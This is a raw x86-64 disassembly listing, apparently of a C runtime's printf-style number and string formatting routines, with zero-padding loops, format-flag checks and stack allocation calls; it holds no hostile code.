   32c48320b:	41 83 fb 6f          	cmp    $0x6f,%r11d
   32c48320f:	0f 84 fc 03 00 00    	je     0x32c483611
   32c483215:	3b 45 fc             	cmp    -0x4(%rbp),%eax
   32c483218:	0f 8d 42 04 00 00    	jge    0x32c483660
   32c48321e:	44 8b 75 fc          	mov    -0x4(%rbp),%r14d
   32c483222:	41 29 c6             	sub    %eax,%r14d
   32c483225:	44 89 73 0c          	mov    %r14d,0xc(%rbx)
   32c483229:	41 f7 c4 00 08 00 00 	test   $0x800,%r12d
   32c483230:	0f 84 f7 fd ff ff    	je     0x32c48302d
   32c483236:	41 83 ee 02          	sub    $0x2,%r14d
   32c48323a:	45 85 f6             	test   %r14d,%r14d
   32c48323d:	0f 8e 7f 01 00 00    	jle    0x32c4833c2
   32c483243:	48 89 f0             	mov    %rsi,%rax
   32c483246:	44 88 1e             	mov    %r11b,(%rsi)
   32c483249:	48 83 c6 02          	add    $0x2,%rsi
   32c48324d:	41 81 e4 00 04 00 00 	and    $0x400,%r12d
   32c483254:	c6 40 01 30          	movb   $0x30,0x1(%rax)
   32c483258:	0f 84 dc fd ff ff    	je     0x32c48303a
   32c48325e:	45 8d 6e ff          	lea    -0x1(%r14),%r13d
   32c483262:	48 39 f7             	cmp    %rsi,%rdi
   32c483265:	0f 82 1d fe ff ff    	jb     0x32c483088
   32c48326b:	e9 75 fe ff ff       	jmp    0x32c4830e5
   32c483270:	41 81 e4 ff f7 ff ff 	and    $0xfffff7ff,%r12d
   32c483277:	44 89 63 08          	mov    %r12d,0x8(%rbx)
   32c48327b:	45 85 ed             	test   %r13d,%r13d
   32c48327e:	0f 8e 4c 03 00 00    	jle    0x32c4835d0
   32c483284:	44 89 e9             	mov    %r13d,%ecx
   32c483287:	8d 51 ff             	lea    -0x1(%rcx),%edx
   32c48328a:	83 fa 0e             	cmp    $0xe,%edx
   32c48328d:	0f 8e 86 04 00 00    	jle    0x32c483719
   32c483293:	41 89 c9             	mov    %ecx,%r9d
   32c483296:	41 ba 30 30 30 30    	mov    $0x30303030,%r10d
   32c48329c:	48 89 f0             	mov    %rsi,%rax
   32c48329f:	41 c1 e9 04          	shr    $0x4,%r9d
   32c4832a3:	66 41 0f 6e c2       	movd   %r10d,%xmm0
   32c4832a8:	49 c1 e1 04          	shl    $0x4,%r9
   32c4832ac:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   32c4832b1:	4d 8d 04 31          	lea    (%r9,%rsi,1),%r8
   32c4832b5:	41 83 e1 10          	and    $0x10,%r9d
   32c4832b9:	74 15                	je     0x32c4832d0
   32c4832bb:	48 8d 46 10          	lea    0x10(%rsi),%rax
   32c4832bf:	0f 11 06             	movups %xmm0,(%rsi)
   32c4832c2:	4c 39 c0             	cmp    %r8,%rax
   32c4832c5:	74 19                	je     0x32c4832e0
   32c4832c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4832ce:	00 00 
   32c4832d0:	0f 11 00             	movups %xmm0,(%rax)
   32c4832d3:	48 83 c0 20          	add    $0x20,%rax
   32c4832d7:	0f 11 40 f0          	movups %xmm0,-0x10(%rax)
   32c4832db:	4c 39 c0             	cmp    %r8,%rax
   32c4832de:	75 f0                	jne    0x32c4832d0
   32c4832e0:	89 c8                	mov    %ecx,%eax
   32c4832e2:	83 e0 f0             	and    $0xfffffff0,%eax
   32c4832e5:	83 e1 0f             	and    $0xf,%ecx
   32c4832e8:	74 36                	je     0x32c483320
   32c4832ea:	41 89 d0             	mov    %edx,%r8d
   32c4832ed:	41 29 c0             	sub    %eax,%r8d
   32c4832f0:	48 01 f0             	add    %rsi,%rax
   32c4832f3:	4a 8d 4c 00 01       	lea    0x1(%rax,%r8,1),%rcx
   32c4832f8:	41 83 e0 01          	and    $0x1,%r8d
   32c4832fc:	75 12                	jne    0x32c483310
   32c4832fe:	48 83 c0 01          	add    $0x1,%rax
   32c483302:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   32c483306:	48 39 c8             	cmp    %rcx,%rax
   32c483309:	74 15                	je     0x32c483320
   32c48330b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c483310:	c6 00 30             	movb   $0x30,(%rax)
   32c483313:	48 83 c0 02          	add    $0x2,%rax
   32c483317:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   32c48331b:	48 39 c8             	cmp    %rcx,%rax
   32c48331e:	75 f0                	jne    0x32c483310
   32c483320:	48 63 d2             	movslq %edx,%rdx
   32c483323:	48 8d 74 16 01       	lea    0x1(%rsi,%rdx,1),%rsi
   32c483328:	48 39 fe             	cmp    %rdi,%rsi
   32c48332b:	0f 84 bf fc ff ff    	je     0x32c482ff0
   32c483331:	48 89 f0             	mov    %rsi,%rax
   32c483334:	48 29 f8             	sub    %rdi,%rax
   32c483337:	89 c2                	mov    %eax,%edx
   32c483339:	3b 45 fc             	cmp    -0x4(%rbp),%eax
   32c48333c:	0f 8c c6 fc ff ff    	jl     0x32c483008
   32c483342:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   32c483349:	41 83 fb 6f          	cmp    $0x6f,%r11d
   32c48334d:	0f 84 00 fd ff ff    	je     0x32c483053
   32c483353:	44 8b 63 08          	mov    0x8(%rbx),%r12d
   32c483357:	41 f7 c4 00 08 00 00 	test   $0x800,%r12d
   32c48335e:	0f 84 ef fc ff ff    	je     0x32c483053
   32c483364:	44 88 1e             	mov    %r11b,(%rsi)
   32c483367:	48 8d 46 02          	lea    0x2(%rsi),%rax
   32c48336b:	41 be ff ff ff ff    	mov    $0xffffffff,%r14d
   32c483371:	c6 46 01 30          	movb   $0x30,0x1(%rsi)
   32c483375:	eb 56                	jmp    0x32c4833cd
   32c483377:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48337e:	00 00 
   32c483380:	41 83 fb 6f          	cmp    $0x6f,%r11d
   32c483384:	0f 84 63 02 00 00    	je     0x32c4835ed
   32c48338a:	48 89 f0             	mov    %rsi,%rax
   32c48338d:	8b 4d fc             	mov    -0x4(%rbp),%ecx
   32c483390:	48 29 f8             	sub    %rdi,%rax
   32c483393:	39 c8                	cmp    %ecx,%eax
   32c483395:	0f 8d c5 02 00 00    	jge    0x32c483660
   32c48339b:	41 89 ce             	mov    %ecx,%r14d
   32c48339e:	44 89 e2             	mov    %r12d,%edx
   32c4833a1:	41 29 c6             	sub    %eax,%r14d
   32c4833a4:	44 89 73 0c          	mov    %r14d,0xc(%rbx)
   32c4833a8:	41 f7 c4 00 08 00 00 	test   $0x800,%r12d
   32c4833af:	0f 84 6f fc ff ff    	je     0x32c483024
   32c4833b5:	41 83 ee 02          	sub    $0x2,%r14d
   32c4833b9:	45 85 f6             	test   %r14d,%r14d
   32c4833bc:	0f 8f 6c 03 00 00    	jg     0x32c48372e
   32c4833c2:	44 88 1e             	mov    %r11b,(%rsi)
   32c4833c5:	48 8d 46 02          	lea    0x2(%rsi),%rax
   32c4833c9:	c6 46 01 30          	movb   $0x30,0x1(%rsi)
   32c4833cd:	48 39 c7             	cmp    %rax,%rdi
   32c4833d0:	0f 83 3f fd ff ff    	jae    0x32c483115
   32c4833d6:	45 8d 6e ff          	lea    -0x1(%r14),%r13d
   32c4833da:	44 89 e2             	mov    %r12d,%edx
   32c4833dd:	48 89 c6             	mov    %rax,%rsi
   32c4833e0:	e9 a3 fc ff ff       	jmp    0x32c483088
   32c4833e5:	0f 1f 00             	nopl   (%rax)
   32c4833e8:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   32c4833ed:	0f 84 61 fd ff ff    	je     0x32c483154
   32c4833f3:	b9 03 00 00 00       	mov    $0x3,%ecx
   32c4833f8:	41 89 c0             	mov    %eax,%r8d
   32c4833fb:	41 ba ab aa aa aa    	mov    $0xaaaaaaab,%r10d
   32c483401:	8b 7b 0c             	mov    0xc(%rbx),%edi
   32c483404:	4d 0f af c2          	imul   %r10,%r8
   32c483408:	89 7d fc             	mov    %edi,-0x4(%rbp)
   32c48340b:	49 c1 e8 21          	shr    $0x21,%r8
   32c48340f:	44 01 c0             	add    %r8d,%eax
   32c483412:	39 f8                	cmp    %edi,%eax
   32c483414:	0f 4c c7             	cmovl  %edi,%eax
   32c483417:	48 98                	cltq
   32c483419:	48 83 c0 0f          	add    $0xf,%rax
   32c48341d:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   32c483421:	e8 5a f0 ff ff       	call   0x32c482480
   32c483426:	48 29 c4             	sub    %rax,%rsp
   32c483429:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   32c48342e:	41 83 fb 62          	cmp    $0x62,%r11d
   32c483432:	74 14                	je     0x32c483448
   32c483434:	41 83 fb 6f          	cmp    $0x6f,%r11d
   32c483438:	0f 84 3d fd ff ff    	je     0x32c48317b
   32c48343e:	41 83 fb 42          	cmp    $0x42,%r11d
   32c483442:	0f 85 6c fb ff ff    	jne    0x32c482fb4
   32c483448:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   32c48344e:	4d 85 c9             	test   %r9,%r9
   32c483451:	0f 85 33 fd ff ff    	jne    0x32c48318a
   32c483457:	e9 67 fb ff ff       	jmp    0x32c482fc3
   32c48345c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c483460:	45 8b 68 10          	mov    0x10(%r8),%r13d
   32c483464:	31 c0                	xor    %eax,%eax
   32c483466:	45 8b 60 08          	mov    0x8(%r8),%r12d
   32c48346a:	45 85 ed             	test   %r13d,%r13d
   32c48346d:	44 89 e2             	mov    %r12d,%edx
   32c483470:	41 0f 49 c5          	cmovns %r13d,%eax
   32c483474:	83 c0 42             	add    $0x42,%eax
   32c483477:	41 f7 c4 00 10 00 00 	test   $0x1000,%r12d
   32c48347e:	0f 84 17 02 00 00    	je     0x32c48369b
   32c483484:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   32c483489:	0f 84 42 02 00 00    	je     0x32c4836d1
   32c48348f:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c483494:	e9 5f ff ff ff       	jmp    0x32c4833f8
   32c483499:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c4834a0:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   32c4834a5:	0f 85 1c 02 00 00    	jne    0x32c4836c7
   32c4834ab:	8b 7b 0c             	mov    0xc(%rbx),%edi
   32c4834ae:	39 f8                	cmp    %edi,%eax
   32c4834b0:	89 7d fc             	mov    %edi,-0x4(%rbp)
   32c4834b3:	0f 4c c7             	cmovl  %edi,%eax
   32c4834b6:	48 98                	cltq
   32c4834b8:	48 83 c0 0f          	add    $0xf,%rax
   32c4834bc:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   32c4834c0:	e8 bb ef ff ff       	call   0x32c482480
   32c4834c5:	b9 04 00 00 00       	mov    $0x4,%ecx
   32c4834ca:	48 29 c4             	sub    %rax,%rsp
   32c4834cd:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   32c4834d2:	e9 5d ff ff ff       	jmp    0x32c483434
   32c4834d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4834de:	00 00 
   32c4834e0:	44 89 e0             	mov    %r12d,%eax
   32c4834e3:	25 00 06 00 00       	and    $0x600,%eax
   32c4834e8:	3d 00 02 00 00       	cmp    $0x200,%eax
   32c4834ed:	0f 85 3a fb ff ff    	jne    0x32c48302d
   32c4834f3:	41 8d 56 ff          	lea    -0x1(%r14),%edx
   32c4834f7:	83 fa 0e             	cmp    $0xe,%edx
   32c4834fa:	0f 8e 24 02 00 00    	jle    0x32c483724
   32c483500:	45 89 f0             	mov    %r14d,%r8d
   32c483503:	41 ba 30 30 30 30    	mov    $0x30303030,%r10d
   32c483509:	48 89 f0             	mov    %rsi,%rax
   32c48350c:	41 c1 e8 04          	shr    $0x4,%r8d
   32c483510:	66 41 0f 6e c2       	movd   %r10d,%xmm0
   32c483515:	49 c1 e0 04          	shl    $0x4,%r8
   32c483519:	66 0f 70 c0 00       	pshufd $0x0,%xmm0,%xmm0
   32c48351e:	49 8d 0c 30          	lea    (%r8,%rsi,1),%rcx
   32c483522:	41 83 e0 10          	and    $0x10,%r8d
   32c483526:	74 18                	je     0x32c483540
   32c483528:	48 8d 46 10          	lea    0x10(%rsi),%rax
   32c48352c:	0f 11 06             	movups %xmm0,(%rsi)
   32c48352f:	48 39 c1             	cmp    %rax,%rcx
   32c483532:	74 1c                	je     0x32c483550
   32c483534:	90                   	nop
   32c483535:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48353c:	00 00 00 00 
   32c483540:	0f 11 00             	movups %xmm0,(%rax)
   32c483543:	48 83 c0 20          	add    $0x20,%rax
   32c483547:	0f 11 40 f0          	movups %xmm0,-0x10(%rax)
   32c48354b:	48 39 c1             	cmp    %rax,%rcx
   32c48354e:	75 f0                	jne    0x32c483540
   32c483550:	44 89 f0             	mov    %r14d,%eax
   32c483553:	83 e0 f0             	and    $0xfffffff0,%eax
   32c483556:	41 83 e6 0f          	and    $0xf,%r14d
   32c48355a:	74 34                	je     0x32c483590
   32c48355c:	89 d1                	mov    %edx,%ecx
   32c48355e:	29 c1                	sub    %eax,%ecx
   32c483560:	48 01 f0             	add    %rsi,%rax
   32c483563:	4c 8d 44 08 01       	lea    0x1(%rax,%rcx,1),%r8
   32c483568:	83 e1 01             	and    $0x1,%ecx
   32c48356b:	75 13                	jne    0x32c483580
   32c48356d:	48 83 c0 01          	add    $0x1,%rax
   32c483571:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   32c483575:	49 39 c0             	cmp    %rax,%r8
   32c483578:	74 16                	je     0x32c483590
   32c48357a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c483580:	c6 00 30             	movb   $0x30,(%rax)
   32c483583:	48 83 c0 02          	add    $0x2,%rax
   32c483587:	c6 40 ff 30          	movb   $0x30,-0x1(%rax)
   32c48358b:	49 39 c0             	cmp    %rax,%r8
   32c48358e:	75 f0                	jne    0x32c483580
   32c483590:	48 63 d2             	movslq %edx,%rdx
   32c483593:	41 be ff ff ff ff    	mov    $0xffffffff,%r14d
   32c483599:	48 8d 44 16 01       	lea    0x1(%rsi,%rdx,1),%rax
   32c48359e:	41 83 fb 6f          	cmp    $0x6f,%r11d
   32c4835a2:	0f 84 25 fe ff ff    	je     0x32c4833cd
   32c4835a8:	41 f7 c4 00 08 00 00 	test   $0x800,%r12d
   32c4835af:	0f 84 18 fe ff ff    	je     0x32c4833cd
   32c4835b5:	44 88 18             	mov    %r11b,(%rax)
   32c4835b8:	c6 40 01 30          	movb   $0x30,0x1(%rax)
   32c4835bc:	48 8d 44 16 03       	lea    0x3(%rsi,%rdx,1),%rax
   32c4835c1:	e9 07 fe ff ff       	jmp    0x32c4833cd
   32c4835c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c4835cd:	00 00 00 
   32c4835d0:	41 83 fb 6f          	cmp    $0x6f,%r11d
   32c4835d4:	74 73                	je     0x32c483649
   32c4835d6:	45 85 ed             	test   %r13d,%r13d
   32c4835d9:	0f 85 11 fa ff ff    	jne    0x32c482ff0
   32c4835df:	8b 45 fc             	mov    -0x4(%rbp),%eax
   32c4835e2:	85 c0                	test   %eax,%eax
   32c4835e4:	7e 7a                	jle    0x32c483660
   32c4835e6:	31 d2                	xor    %edx,%edx
   32c4835e8:	e9 1b fa ff ff       	jmp    0x32c483008
   32c4835ed:	41 f7 c4 00 08 00 00 	test   $0x800,%r12d
   32c4835f4:	75 43                	jne    0x32c483639
   32c4835f6:	48 89 f0             	mov    %rsi,%rax
   32c4835f9:	48 29 f8             	sub    %rdi,%rax
   32c4835fc:	39 45 fc             	cmp    %eax,-0x4(%rbp)
   32c4835ff:	0f 8f e2 00 00 00    	jg     0x32c4836e7
   32c483605:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   32c48360c:	e9 42 fa ff ff       	jmp    0x32c483053
   32c483611:	41 f7 c4 00 08 00 00 	test   $0x800,%r12d
   32c483618:	0f 84 c0 00 00 00    	je     0x32c4836de
   32c48361e:	49 83 c6 02          	add    $0x2,%r14
   32c483622:	c6 06 30             	movb   $0x30,(%rsi)
   32c483625:	48 89 fe             	mov    %rdi,%rsi
   32c483628:	4c 39 f7             	cmp    %r14,%rdi
   32c48362b:	0f 84 bf f9 ff ff    	je     0x32c482ff0
   32c483631:	4c 89 f6             	mov    %r14,%rsi
   32c483634:	e9 f8 fc ff ff       	jmp    0x32c483331
   32c483639:	c6 06 30             	movb   $0x30,(%rsi)
   32c48363c:	49 8d 76 02          	lea    0x2(%r14),%rsi
   32c483640:	48 39 fe             	cmp    %rdi,%rsi
   32c483643:	0f 85 e8 fc ff ff    	jne    0x32c483331
   32c483649:	45 85 ed             	test   %r13d,%r13d
   32c48364c:	0f 84 df fc ff ff    	je     0x32c483331
   32c483652:	e9 99 f9 ff ff       	jmp    0x32c482ff0
   32c483657:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48365e:	00 00 
   32c483660:	c7 43 0c ff ff ff ff 	movl   $0xffffffff,0xc(%rbx)
   32c483667:	e9 eb fc ff ff       	jmp    0x32c483357
   32c48366c:	0f 1f 40 00          	nopl   0x0(%rax)
   32c483670:	45 8b 68 10          	mov    0x10(%r8),%r13d
   32c483674:	31 c0                	xor    %eax,%eax
   32c483676:	45 8b 60 08          	mov    0x8(%r8),%r12d
   32c48367a:	45 85 ed             	test   %r13d,%r13d
   32c48367d:	44 89 e2             	mov    %r12d,%edx
   32c483680:	41 0f 49 c5          	cmovns %r13d,%eax
   32c483684:	83 c0 42             	add    $0x42,%eax
   32c483687:	41 f7 c4 00 10 00 00 	test   $0x1000,%r12d
   32c48368e:	74 0b                	je     0x32c48369b
   32c483690:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   32c483695:	0f 85 f4 fd ff ff    	jne    0x32c48348f
   32c48369b:	8b 7b 0c             	mov    0xc(%rbx),%edi
   32c48369e:	39 c7                	cmp    %eax,%edi
   32c4836a0:	89 7d fc             	mov    %edi,-0x4(%rbp)
   32c4836a3:	0f 4d c7             	cmovge %edi,%eax
   32c4836a6:	48 98                	cltq
   32c4836a8:	48 83 c0 0f          	add    $0xf,%rax
   32c4836ac:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   32c4836b0:	e8 cb ed ff ff       	call   0x32c482480
   32c4836b5:	b9 01 00 00 00       	mov    $0x1,%ecx
   32c4836ba:	48 29 c4             	sub    %rax,%rsp
   32c4836bd:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   32c4836c2:	e9 81 fd ff ff       	jmp    0x32c483448
   32c4836c7:	b9 04 00 00 00       	mov    $0x4,%ecx
   32c4836cc:	e9 27 fd ff ff       	jmp    0x32c4833f8
   32c4836d1:	8b 7b 0c             	mov    0xc(%rbx),%edi
   32c4836d4:	39 f8                	cmp    %edi,%eax
   32c4836d6:	89 7d fc             	mov    %edi,-0x4(%rbp)
   32c4836d9:	0f 4c c7             	cmovl  %edi,%eax
   32c4836dc:	eb c8                	jmp    0x32c4836a6
   32c4836de:	3b 45 fc             	cmp    -0x4(%rbp),%eax
   32c4836e1:	0f 8d 1e ff ff ff    	jge    0x32c483605
   32c4836e7:	44 8b 75 fc          	mov    -0x4(%rbp),%r14d
   32c4836eb:	44 89 e2             	mov    %r12d,%edx
   32c4836ee:	41 29 c6             	sub    %eax,%r14d
   32c4836f1:	44 89 73 0c          	mov    %r14d,0xc(%rbx)
   32c4836f5:	e9 2a f9 ff ff       	jmp    0x32c483024
   32c4836fa:	41 81 e4 ff f7 ff ff 	and    $0xfffff7ff,%r12d
   32c483701:	48 89 fe             	mov    %rdi,%rsi
   32c483704:	44 89 e9             	mov    %r13d,%ecx
   32c483707:	44 89 63 08          	mov    %r12d,0x8(%rbx)
   32c48370b:	45 85 ed             	test   %r13d,%r13d
   32c48370e:	0f 8f 73 fb ff ff    	jg     0x32c483287
   32c483714:	e9 30 ff ff ff       	jmp    0x32c483649
   32c483719:	41 89 d0             	mov    %edx,%r8d
   32c48371c:	48 89 f0             	mov    %rsi,%rax
   32c48371f:	e9 cf fb ff ff       	jmp    0x32c4832f3
   32c483724:	89 d1                	mov    %edx,%ecx
   32c483726:	48 89 f0             	mov    %rsi,%rax
   32c483729:	e9 35 fe ff ff       	jmp    0x32c483563
   32c48372e:	48 89 f0             	mov    %rsi,%rax
   32c483731:	45 85 ed             	test   %r13d,%r13d
   32c483734:	0f 89 0c fb ff ff    	jns    0x32c483246
   32c48373a:	44 89 e1             	mov    %r12d,%ecx
   32c48373d:	81 e1 00 06 00 00    	and    $0x600,%ecx
   32c483743:	81 f9 00 02 00 00    	cmp    $0x200,%ecx
   32c483749:	0f 85 f7 fa ff ff    	jne    0x32c483246
   32c48374f:	e9 9f fd ff ff       	jmp    0x32c4834f3
   32c483754:	90                   	nop
   32c483755:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48375c:	00 00 00 00 
   32c483760:	55                   	push   %rbp
   32c483761:	41 56                	push   %r14
   32c483763:	57                   	push   %rdi
   32c483764:	56                   	push   %rsi
   32c483765:	53                   	push   %rbx
   32c483766:	48 83 ec 30          	sub    $0x30,%rsp
   32c48376a:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   32c48376f:	48 89 cb             	mov    %rcx,%rbx
   32c483772:	83 79 14 fd          	cmpl   $0xfffffffd,0x14(%rcx)
   32c483776:	0f 84 d4 00 00 00    	je     0x32c483850
   32c48377c:	0f b7 51 18          	movzwl 0x18(%rcx),%edx
   32c483780:	66 85 d2             	test   %dx,%dx
   32c483783:	0f 84 a7 00 00 00    	je     0x32c483830
   32c483789:	48 63 43 14          	movslq 0x14(%rbx),%rax
   32c48378d:	49 89 e6             	mov    %rsp,%r14
   32c483790:	48 83 c0 0f          	add    $0xf,%rax
   32c483794:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   32c483798:	e8 e3 ec ff ff       	call   0x32c482480
   32c48379d:	48 29 c4             	sub    %rax,%rsp
   32c4837a0:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   32c4837a4:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
   32c4837ab:	00 
   32c4837ac:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   32c4837b1:	48 89 f1             	mov    %rsi,%rcx
   32c4837b4:	e8 27 48 00 00       	call   0x32c487fe0
   32c4837b9:	85 c0                	test   %eax,%eax
   32c4837bb:	0f 8e cf 00 00 00    	jle    0x32c483890
   32c4837c1:	83 e8 01             	sub    $0x1,%eax
   32c4837c4:	48 8d 7c 06 01       	lea    0x1(%rsi,%rax,1),%rdi
   32c4837c9:	eb 1a                	jmp    0x32c4837e5
   32c4837cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4837d0:	48 63 53 24          	movslq 0x24(%rbx),%rdx
   32c4837d4:	88 0c 10             	mov    %cl,(%rax,%rdx,1)
   32c4837d7:	8b 43 24             	mov    0x24(%rbx),%eax
   32c4837da:	83 c0 01             	add    $0x1,%eax
   32c4837dd:	89 43 24             	mov    %eax,0x24(%rbx)
   32c4837e0:	48 39 f7             	cmp    %rsi,%rdi
   32c4837e3:	74 36                	je     0x32c48381b
   32c4837e5:	8b 53 08             	mov    0x8(%rbx),%edx
   32c4837e8:	48 83 c6 01          	add    $0x1,%rsi
   32c4837ec:	f6 c6 40             	test   $0x40,%dh
   32c4837ef:	75 08                	jne    0x32c4837f9
   32c4837f1:	8b 43 24             	mov    0x24(%rbx),%eax
   32c4837f4:	39 43 28             	cmp    %eax,0x28(%rbx)
   32c4837f7:	7e e1                	jle    0x32c4837da
   32c4837f9:	0f be 4e ff          	movsbl -0x1(%rsi),%ecx
   32c4837fd:	48 8b 03             	mov    (%rbx),%rax
   32c483800:	80 e6 20             	and    $0x20,%dh
   32c483803:	74 cb                	je     0x32c4837d0
   32c483805:	48 89 c2             	mov    %rax,%rdx
   32c483808:	e8 73 4c 00 00       	call   0x32c488480
   32c48380d:	8b 43 24             	mov    0x24(%rbx),%eax
   32c483810:	83 c0 01             	add    $0x1,%eax
   32c483813:	89 43 24             	mov    %eax,0x24(%rbx)
   32c483816:	48 39 f7             	cmp    %rsi,%rdi
   32c483819:	75 ca                	jne    0x32c4837e5
   32c48381b:	4c 89 f4             	mov    %r14,%rsp
   32c48381e:	48 89 ec             	mov    %rbp,%rsp
   32c483821:	5b                   	pop    %rbx
   32c483822:	5e                   	pop    %rsi
   32c483823:	5f                   	pop    %rdi
   32c483824:	41 5e                	pop    %r14
   32c483826:	5d                   	pop    %rbp
   32c483827:	c3                   	ret
   32c483828:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48382f:	00 
   32c483830:	48 89 da             	mov    %rbx,%rdx
   32c483833:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   32c483838:	e8 03 ee ff ff       	call   0x32c482640
   32c48383d:	90                   	nop
   32c48383e:	48 89 ec             	mov    %rbp,%rsp
   32c483841:	5b                   	pop    %rbx
   32c483842:	5e                   	pop    %rsi
   32c483843:	5f                   	pop    %rdi
   32c483844:	41 5e                	pop    %r14
   32c483846:	5d                   	pop    %rbp
   32c483847:	c3                   	ret
   32c483848:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48384f:	00 
   32c483850:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
   32c483857:	00 
   32c483858:	e8 33 4c 00 00       	call   0x32c488490
   32c48385d:	48 8d 4d f6          	lea    -0xa(%rbp),%rcx
   32c483861:	4c 8d 4d f8          	lea    -0x8(%rbp),%r9
   32c483865:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   32c48386b:	48 8b 10             	mov    (%rax),%rdx
   32c48386e:	e8 ad 47 00 00       	call   0x32c488020
   32c483873:	85 c0                	test   %eax,%eax
   32c483875:	7e 31                	jle    0x32c4838a8
   32c483877:	0f b7 55 f6          	movzwl -0xa(%rbp),%edx
   32c48387b:	66 89 53 18          	mov    %dx,0x18(%rbx)
   32c48387f:	89 43 14             	mov    %eax,0x14(%rbx)
   32c483882:	e9 f9 fe ff ff       	jmp    0x32c483780
   32c483887:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c48388e:	00 00 
   32c483890:	48 89 da             	mov    %rbx,%rdx
   32c483893:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   32c483898:	e8 a3 ed ff ff       	call   0x32c482640
   32c48389d:	4c 89 f4             	mov    %r14,%rsp
   32c4838a0:	e9 79 ff ff ff       	jmp    0x32c48381e
   32c4838a5:	0f 1f 00             	nopl   (%rax)
   32c4838a8:	0f b7 53 18          	movzwl 0x18(%rbx),%edx
   32c4838ac:	eb d1                	jmp    0x32c48387f
   32c4838ae:	66 90                	xchg   %ax,%ax
   32c4838b0:	55                   	push   %rbp
   32c4838b1:	57                   	push   %rdi
   32c4838b2:	56                   	push   %rsi
   32c4838b3:	53                   	push   %rbx
   32c4838b4:	48 83 ec 28          	sub    $0x28,%rsp
   32c4838b8:	41 8b 41 0c          	mov    0xc(%r9),%eax
   32c4838bc:	89 cd                	mov    %ecx,%ebp
   32c4838be:	48 89 d6             	mov    %rdx,%rsi
   32c4838c1:	44 89 c7             	mov    %r8d,%edi
   32c4838c4:	4c 89 cb             	mov    %r9,%rbx
   32c4838c7:	45 85 c0             	test   %r8d,%r8d
   32c4838ca:	0f 8e f0 01 00 00    	jle    0x32c483ac0
   32c4838d0:	41 39 c0             	cmp    %eax,%r8d
   32c4838d3:	0f 8f 37 01 00 00    	jg     0x32c483a10
   32c4838d9:	41 8b 51 10          	mov    0x10(%r9),%edx
   32c4838dd:	44 29 c0             	sub    %r8d,%eax
   32c4838e0:	39 d0                	cmp    %edx,%eax
   32c4838e2:	0f 8f 28 03 00 00    	jg     0x32c483c10
   32c4838e8:	41 c7 41 0c ff ff ff 	movl   $0xffffffff,0xc(%r9)
   32c4838ef:	ff 
   32c4838f0:	41 8b 51 08          	mov    0x8(%r9),%edx
   32c4838f4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   32c4838f9:	80 e6 10             	and    $0x10,%dh
   32c4838fc:	0f 84 ee 01 00 00    	je     0x32c483af0
   32c483902:	66 83 7b 20 00       	cmpw   $0x0,0x20(%rbx)
   32c483907:	0f 84 e3 01 00 00    	je     0x32c483af0
   32c48390d:	8d 57 02             	lea    0x2(%rdi),%edx
   32c483910:	41 b8 ab aa aa aa    	mov    $0xaaaaaaab,%r8d
   32c483916:	89 c1                	mov    %eax,%ecx
   32c483918:	49 0f af d0          	imul   %r8,%rdx
   32c48391c:	48 c1 ea 21          	shr    $0x21,%rdx
   32c483920:	83 fa 01             	cmp    $0x1,%edx
   32c483923:	0f 84 c7 01 00 00    	je     0x32c483af0
   32c483929:	83 ea 01             	sub    $0x1,%edx
   32c48392c:	89 c8                	mov    %ecx,%eax
   32c48392e:	29 ca                	sub    %ecx,%edx
   32c483930:	eb 1e                	jmp    0x32c483950
   32c483932:	0f 1f 00             	nopl   (%rax)
   32c483935:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48393c:	00 00 00 00 
   32c483940:	83 e8 01             	sub    $0x1,%eax
   32c483943:	89 d1                	mov    %edx,%ecx
   32c483945:	01 c1                	add    %eax,%ecx
   32c483947:	89 43 0c             	mov    %eax,0xc(%rbx)
   32c48394a:	0f 84 a0 01 00 00    	je     0x32c483af0
